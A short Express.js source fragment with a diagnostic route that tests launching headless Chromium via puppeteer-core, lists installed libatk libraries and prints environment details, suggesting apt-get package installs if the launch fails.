app.get("/system-check", async (req, res) => {
  try {
    const puppeteer = require("puppeteer-core");

    res.setHeader("Content-Type", "text/html");
    res.write("<h1>System Check</h1>");
    res.write("<pre>Running browser launch test...</pre>");

    try {
      // Try launching browser directly with puppeteer
      res.write("<pre>Attempting to launch browser...</pre>");

      const browser = await puppeteer.launch({
        args: [
          "--no-sandbox",
          "--disable-setuid-sandbox",
          "--disable-dev-shm-usage",
        ],
        headless: true,
      });

      res.write(
        "<pre style='color:green'>Browser launched successfully!</pre>"
      );

      // Check version
      const version = await browser.version();
      res.write(`<pre>Browser version: ${version}</pre>`);

      await browser.close();
      res.write("<pre>Browser closed successfully.</pre>");

      // Check system libraries
      res.write("<h2>System Libraries</h2>");
      const { execSync } = require("child_process");

      try {
        const libCheck = execSync("ldconfig -p | grep libatk").toString();
        res.write(`<pre>${libCheck}</pre>`);
      } catch (err) {
        res.write(
          `<pre style='color:red'>Error checking libraries: ${err.message}</pre>`
        );
      }

      res.write("<h2>Environment</h2>");
      res.write(`<pre>Node.js: ${process.version}</pre>`);
      res.write(`<pre>Platform: ${process.platform}</pre>`);

      res.end("<p>System check complete!</p>");
    } catch (browserErr) {
      res.write(
        `<pre style='color:red'>Browser launch failed: ${browserErr.message}</pre>`
      );
      res.write("<h2>Recommended Solution</h2>");
      res.write(`<pre>
1. SSH into your server
2. Run: sudo apt-get update
3. Run: sudo apt-get install -y libatk1.0-0 libatk-bridge2.0-0 libcups2 libxkbcommon0 libxcomposite1 libxdamage1 libxfixes3 libxrandr2 libgbm1 libpango-1.0-0 libcairo2 libasound2 libnss3 libx11-xcb1 libxss1
4. Restart the application: pm2 restart whatsapp
</pre>`);
      res.end();
    }
  } catch (err) {
    res.status(500).send(`System check error: ${err.message}`);
  }
});

app.listen(port, () => {
  console.log(`API server running on http://localhost:${port}`);
});
